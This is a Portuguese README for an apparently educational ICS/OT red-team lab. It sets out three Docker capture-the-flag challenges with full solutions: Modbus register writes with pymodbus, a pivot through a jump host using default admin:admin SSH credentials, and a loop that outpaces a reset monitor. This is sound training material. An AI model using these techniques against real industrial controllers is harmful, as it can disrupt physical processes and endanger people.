# Probatio Labs — Laboratório Virtual de Segurança ICS/OT

Ambiente de treinamento em segurança de Sistemas de Controle Industrial
(ICS) / Tecnologia Operacional (OT). Três desafios consecutivos formam um
trabalho progressivo sob a perspectiva ofensiva (red team), seguindo a
narrativa de um analista de segurança júnior investigando incidentes na
fictícia Planta Industrial "Probatio".

---

## Sumário

- [Requisitos](#requisitos)
- [Início rápido](#início-rápido)
- [Arquitetura dos três laboratórios](#arquitetura-dos-três-laboratórios)
- [Serviços](#serviços)
- [Redes](#redes)
- [Frontend e progressão](#frontend-e-progressão)
- [Desafio 01 — Reconhecimento (Discovery/Collection)](#desafio-01--reconhecimento)
- [Desafio 02 — Exploração (Initial Access/Lateral Movement)](#desafio-02--exploração)
- [Desafio 03 — Impacto (Impair Process Control/Impact)](#desafio-03--impacto)
- [Modelo de flag](#modelo-de-flag)
- [Comandos úteis](#comandos-úteis)
- [Estrutura do projeto](#estrutura-do-projeto)
- [Detalhes técnicos](#detalhes-técnicos)
- [Notas de segurança](#notas-de-segurança)
- [Solução de problemas](#solução-de-problemas)

---

## Requisitos

- Docker Engine 24+ (ou Docker Desktop)
- Docker Compose v2 (`docker compose`, não `docker-compose`)
- Navegador web moderno (Chrome, Firefox, Edge)

---

## Início rápido

Os três laboratórios usam as mesmas portas (8080 e 7681), portanto **roda
um por vez**:

```bash
cd probatio-labs

# Desafio 01
docker compose up -d --build

# Desafio 02 (derrube o anterior antes)
docker compose -f docker-compose.lab2.yml up -d --build

# Desafio 03
docker compose -f docker-compose.lab3.yml up -d --build

# Parar (mantém as flags geradas nos volumes)
docker compose down            # lab 1
docker compose -f docker-compose.lab2.yml down
docker compose -f docker-compose.lab3.yml down
```

| Serviço    | URL                     | Descrição                         |
|------------|-------------------------|-----------------------------------|
| Frontend   | http://localhost:8080   | Seletor de desafios + validação   |
| Attacker   | http://localhost:7681   | Terminal web (ttyd)               |
| Target     | (só rede interna)       | Servidor Modbus/TCP               |

> **Dica:** se o build falhar com `exec format error`, veja
> [Solução de problemas](#solução-de-problemas).

---

## Arquitetura dos três laboratórios

### Desafio 01 — segmentação simples

```
┌─────────────────────────────────┐
│        default (bridge)         │
│  frontend :8080  attacker :7681 │─────▶ host
└────────────┬────────────────────┘
             │
      ┌──────┴──────────────────────────────┐
      │     ot_lab_net (172.28.0.0/24)      │
      │     internal: true (sem internet)   │
      │                                     │
      │  ┌───────────┐  :502  ┌──────────┐ │
      │  │ attacker   │──────▶│  target   │ │
      │  │172.28.0.10 │       │172.28.0.20│ │
      │  └───────────┘       └──────────┘ │
      │                 volume: flag_data   │
      └────────────────────────────────────┘
```

### Desafio 02 — TI/OT segmentadas + jump host

```
      default (bridge): frontend :8080, attacker :7681 ────▶ host
             │
      ┌──────┴───────────────────────────┐
      │  it_net (172.29.0.0/24) internal │
      │  attacker .10 ◀──SSH admin:admin──▶ gateway .2 ───┐
      └──────────────────────────────────┘                │
                                                ┌─────────┴──────────────┐
                                                │ ot_net (172.30.0.0/24)│
                                                │ gateway .2  target .20 │
                                                │ (pivot obrigatório)    │
                                                └────────────────────────┘
```

O atacante **não** tem rota até `172.30.0.0/24`: o alcance do PLC exige
pivoteamento pelo jump host (`ssh admin@172.29.0.2`, credencial padrão).

### Desafio 03 — monitoramento defensivo

```
      default (bridge): frontend :8080, attacker :7681 ────▶ host
             │
      ┌──────┴────────────────────────────────┐
      │  ot_lab_net3 (172.31.0.0/24) internal │
      │  attacker .10 ──:502──▶ target .20    │
      │          (target com monitor ativo)   │
      └───────────────────────────────────────┘
```

O monitor reseta o registrador a cada 1s: é preciso **sustentar** o valor
anômalo (~10s) para gerar a flag.

---

## Serviços

### Frontend (Flask)

- **Container:** `frontend` · **Porta:** 8080
- **Responsabilidade:** Seletor de desafios, tutorial de cada lab,
  validação de flags
- **Endpoints:**
  - `GET /` — Seletor de desafios (progresso via `localStorage`)
  - `GET /lab/<1|2|3>` — Página do desafio (terminal + formulário)
  - `POST /submit` — Valida `{"lab": N, "flag": "..."}` contra
    `/flags/labN/flag.txt`
  - `GET /health` — Healthcheck
- **Volumes (somente leitura):** `flag_data:/flags/lab1`,
  `flag_data_lab2:/flags/lab2`, `flag_data_lab3:/flags/lab3`

### Attacker (compartilhado entre os 3 labs)

- **Container:** `attacker` · **Porta:** 7681 (ttyd)
- **Base:** `debian:bookworm-slim`
- **Ferramentas:** nmap, python3, pymodbus, scapy, netcat, curl,
  openssh-client, sshpass
- **Permissões:** `NET_RAW`, `NET_ADMIN`
- **Hints:** build arg `HINTS_FILE` escolhe `hints-lab1/2/3.md` →
  `/root/hints.md` (leia com `cat /root/hints.md`)
- **Redes:** `default` (publica a porta) + a rede OT/TI do lab ativo

### Target

- **Lab 1 e 2:** `target/` — Modbus/TCP + watcher (valor ≥ 150 gera flag);
  remove flag stale no startup
- **Lab 3:** `target-lab3/` — Modbus/TCP + **monitor** que reseta valores
  ≥ 150 a cada 1s e só gera flag após 10 verificações consecutivas
- **Base:** `python:3.11-slim` · **pymodbus:** 3.6.9
- **Volume:** flag do lab correspondente em `/flag/flag.txt`

### Gateway (somente lab 2)

- **Container:** `gateway` — jump host
- **SSH:** porta 22, credenciais padrão `admin:admin`
- **Ferramentas:** nmap, python3 + pymodbus, netcat
- **Redes:** `it_net` (172.29.0.2) + `ot_net` (172.30.0.2)

---

## Redes

| Lab | Rede         | Subnet          | Membros                                    | Internal |
|-----|--------------|-----------------|--------------------------------------------|----------|
| 1   | `ot_lab_net` | 172.28.0.0/24   | attacker .10, target .20                   | sim      |
| 2   | `it_net`     | 172.29.0.0/24   | attacker .10, gateway .2                   | sim      |
| 2   | `ot_net`     | 172.30.0.0/24   | gateway .2, target .20                     | sim      |
| 3   | `ot_lab_net3`| 172.31.0.0/24   | attacker .10, target .20                   | sim      |
| all | `default`    | (padrão Docker) | frontend, attacker (port publishing)       | não      |

Notas:

- `internal: true` bloqueia internet **e** a publicação de portas — por
  isso o attacker sempre fica em duas redes: `default` (ttyd) + a rede do
  lab (IP fixo).
- Redes Docker são isoladas entre si: não há rota do attacker direto
  para a OT no lab 2.

---

## Frontend e progressão

- O seletor (`/`) mostra os 3 desafios com estado **Bloqueado /
  Disponível / Concluído**.
- O desbloqueio é progressivo: o desafio N só abre após validar a flag do
  N−1. O estado fica no `localStorage` do navegador
  (`probatio_done_N`) — sem backend de sessão.
- Cada página de desafio embute o terminal (`localhost:7681`), o cenário,
  os MITRE ATT&CK mapeados (Tabela 1 do TCC) e o formulário de flag.
- Flags antigas permanecem válidas entre rodadas (volume persiste até
  `down -v`); o target remove a flag do boot anterior no startup.

---

## Desafio 01 — Reconhecimento

**MITRE:** Discovery · Collection · **Rede:** 172.28.0.0/24

### Objetivo

Descobrir o host industrial, identificar o protocolo Modbus/TCP, ler a
variável crítica e escrevê-la fora da faixa operacional (≥ 150).

### Passo a passo (solução)

```bash
# 1. Descoberta
nmap -sn 172.28.0.0/24

# 2. Porta Modbus
nmap -p 502 172.28.0.20
```

```python
# 3+4. Ler e explorar
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.28.0.20", port=502)
client.connect()
print(client.read_holding_registers(address=0, count=1, device_id=1).registers)  # [50]
client.write_register(address=0, value=200, device_id=1)  # ≥ 150 gera a flag
client.close()
```

```bash
# 5. Flag
cat /root/hints.md   # dicas dentro do terminal
```

---

## Desafio 02 — Exploração

**MITRE:** Initial Access · Lateral Movement · **Redes:** TI 172.29.0.0/24,
OT 172.30.0.0/24

### Objetivo

Explorar as credenciais padrão do jump host, pivoteando da rede TI para a
OT e atingindo o PLC.

### Passo a passo (solução)

```bash
# 1. Descoberta na TI
nmap -sn 172.29.0.0/24
nmap -sV 172.29.0.2          # porta 22 aberta

# 2. Credencial padrão
ssh admin@172.29.0.2         # senha: admin

# 3. Dentro do gateway: alcançar a OT
nmap -sn 172.30.0.0/24
nmap -p 502 172.30.0.20
```

```python
# 4. Explorar o PLC a partir do gateway (python3 + pymodbus já instalados)
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.30.0.20", port=502)
client.connect()
client.write_register(address=0, value=200, device_id=1)
client.close()
```

**Alternativa com túnel SSH:**

```bash
ssh -f -N -L 1502:172.30.0.20:502 admin@172.29.0.2
# no atacante: ModbusTcpClient("127.0.0.1", port=1502)
```

---

## Desafio 03 — Impacto

**MITRE:** Impair Process Control · Impact · **Rede:** 172.31.0.0/24

### Objetivo

Vencer o monitoramento: mantenha o registrador ≥ 150 **sustentado por 10
verificações consecutivas** (~10s). Uma escrita isolada é resetada em ~1s.

### Passo a passo (solução)

```python
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient("172.31.0.20", port=502)
client.connect()

while True:                     # loop mais rápido que o monitor (1s)
    client.write_register(address=0, value=200, device_id=1)
    time.sleep(0.5)
```

Mantenha o loop ~15 segundos e pare com `Ctrl+C`. No log do target:
`[MONITOR] ... (streak 10/10)` → flag escrita em `/flag/flag.txt`.

---

## Modelo de flag

- Cada container de target gera sua flag por instância:
  `FLAG{..._<hash>}`, hash = SHA-256 de um UUID aleatório truncado em 16
  chars.
- Persiste no volume (`flag_data`, `flag_data_lab2`, `flag_data_lab3`)
  até `docker compose down -v`.
- O target **remove a flag do boot anterior** no startup (flag stale).
- O frontend valida comparando com `/flags/labN/flag.txt` (montado `:ro`).

### Validação

1. **Frontend:** http://localhost:8080 → desafio → cole a flag → Enviar
2. **CLI:**

```bash
docker compose exec target cat /flag/flag.txt            # lab 1
docker compose -f docker-compose.lab2.yml exec target cat /flag/flag.txt
docker compose -f docker-compose.lab3.yml exec target cat /flag/flag.txt
```

---

## Comandos úteis

```bash
# Um lab por vez (mesmas portas)
docker compose up -d --build
docker compose down

docker compose -f docker-compose.lab2.yml up -d --build
docker compose -f docker-compose.lab2.yml down

docker compose -f docker-compose.lab3.yml up -d --build
docker compose -f docker-compose.lab3.yml down

# Logs e status
docker compose ps
docker compose logs -f target
docker compose logs -f frontend

# Debug
docker compose exec attacker bash
docker compose exec target bash
docker compose exec target cat /flag/flag.txt

# Rebuild de um serviço
docker compose build --no-cache frontend && docker compose up -d frontend
```

### Teste rápido de cada lab

```bash
# Lab 1: escrita direta gera flag
docker compose exec attacker python3 -c "
from pymodbus.client import ModbusTcpClient
c=ModbusTcpClient('172.28.0.20',port=502); c.connect()
c.write_register(address=0,value=200,device_id=1); c.close()"

# Lab 2: só via gateway
docker compose -f docker-compose.lab2.yml exec attacker \
  sshpass -p admin ssh -o StrictHostKeyChecking=no admin@172.29.0.2 \
  "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('172.30.0.20',port=502); c.connect(); c.write_register(address=0,value=200,device_id=1); c.close()\""

# Lab 3: sustentar ~13s
docker compose -f docker-compose.lab3.yml exec attacker python3 -c "
from pymodbus.client import ModbusTcpClient
import time
c=ModbusTcpClient('172.31.0.20',port=502); c.connect()
t=time.time()
while time.time()-t<13:
    c.write_register(address=0,value=200,device_id=1); time.sleep(0.5)
c.close()"
```

---

## Estrutura do projeto

```
probatio-labs/
├── docker-compose.yml            # Lab 1
├── docker-compose.lab2.yml       # Lab 2 (TI/OT + gateway)
├── docker-compose.lab3.yml       # Lab 3 (monitor)
├── README.md
├── frontend/
│   ├── Dockerfile
│   ├── app.py                    # Rotas /, /lab/<n>, /submit, /health
│   ├── static/
│   │   ├── Icon.png
│   │   ├── style.css
│   │   └── app.js                # Progresso (localStorage) + submit
│   └── templates/
│       ├── base.html
│       ├── index.html            # Seletor de desafios
│       ├── lab1.html
│       ├── lab2.html
│       └── lab3.html
├── attacker/
│   ├── Dockerfile                # ARG HINTS_FILE + openssh-client + sshpass
│   ├── hints-lab1.md
│   ├── hints-lab2.md
│   └── hints-lab3.md
├── gateway/                      # Lab 2: jump host SSH admin:admin
│   └── Dockerfile
├── target/                       # Labs 1 e 2: Modbus + watcher
│   ├── Dockerfile
│   └── plc_simulator.py
└── target-lab3/                  # Lab 3: Modbus + monitor de sustentação
    ├── Dockerfile
    └── plc_simulator.py
```

---

## Detalhes técnicos

### Target labs 1 e 2 (`target/plc_simulator.py`)

- Modbus/TCP (pymodbus 3.6.9), porta 502, 100 holding registers
  (register 0 = crítico, inicial 50; `zero_mode=True` para endereçamento
  0-based)
- Watcher daemon a cada 1s: valor ≥ 150 → flag em `/flag/flag.txt`;
  valor volta à faixa → `flag_written = False`
- Startup remove flag stale do boot anterior

### Target lab 3 (`target-lab3/plc_simulator.py`)

- Mesma base Modbus, porém o monitor **reseta** o registrador para 50
  quando encontra valor ≥ 150
- Conta verificações consecutivas anômalas (`streak`): ao chegar a 10
  (~10s), gera a flag; qualquer leitura normal zera o streak
- Exige loop de escrita mais rápido que o intervalo do monitor

### Gateway (lab 2)

- `openssh-server` com `PasswordAuthentication yes`, `UsePAM no`,
  usuário `admin` (senha `admin`), sem root login
- Roda `sshd` em foreground; conecte com
  `sshpass -p admin ssh admin@172.29.0.2`

### Frontend

- Flask; valida contra arquivos montados `:ro`
- `POST /submit` com `{"lab": N, "flag": "..."}`
- Progresso/desbloqueio no `localStorage` (`probatio_done_N`)

### Versões fixadas

| Dependência       | Versão            |
|-------------------|-------------------|
| pymodbus (target) | 3.6.9             |
| pymodbus (outros) | latest            |
| scapy (attacker)  | latest            |
| flask (frontend)  | latest            |
| ttyd (attacker)   | latest (binário)  |

---

## Notas de segurança

- Redes dos labs são `internal: true` (sem internet, sem expor o alvo).
- O target nunca é acessível do host (`localhost:502` falha).
- Flags são por instância de container (não entre execuções após `down -v`).
- As vulnerabilidades são proposítais (Modbus sem autenticação,
  credenciais padrão, sem validação de range) — apenas para fins
  educacionais, nunca em produção.

---

## Solução de problemas

### Build falha com `exec format error`

O Docker Desktop está com o snapshotter containerd corrompido (binários
materializados vazios). Correção: desligar o Docker Desktop e trocar em
`~/.docker/desktop/settings-store.json`:

```json
"UseContainerdSnapshotter": false
```

Reinicie o Docker Desktop (`docker desktop stop && docker desktop start`)
e refaça o build. **Volumes não são perdidos** (imagens serão rebaixadas).

### Terminal ttyd não aceita digitação

O ttyd precisa de `--writable` no CMD do attacker:

```dockerfile
CMD ["ttyd", "-p", "7681", "--writable", "bash"]
```

### Porta 7681/8080 já em uso

Derrube o lab anterior antes de subir outro: `docker compose down`.

### Flag não é gerada

```bash
docker compose logs target
# Lab 1/2: [WATCHER] CRITICAL_REGISTER=<valor>
# Lab 3:   [MONITOR] ... (streak N/10)
```

### Progresso travado no seletor

O desbloqueio fica no `localStorage`. Para zerar: DevTools →
Application → Local Storage → remover `probatio_done_*`, ou aba anônima.

### Ícone/estilo não atualiza

```bash
docker compose build --no-cache frontend && docker compose up -d frontend
```

Cache do navegador: `Ctrl+Shift+R`.
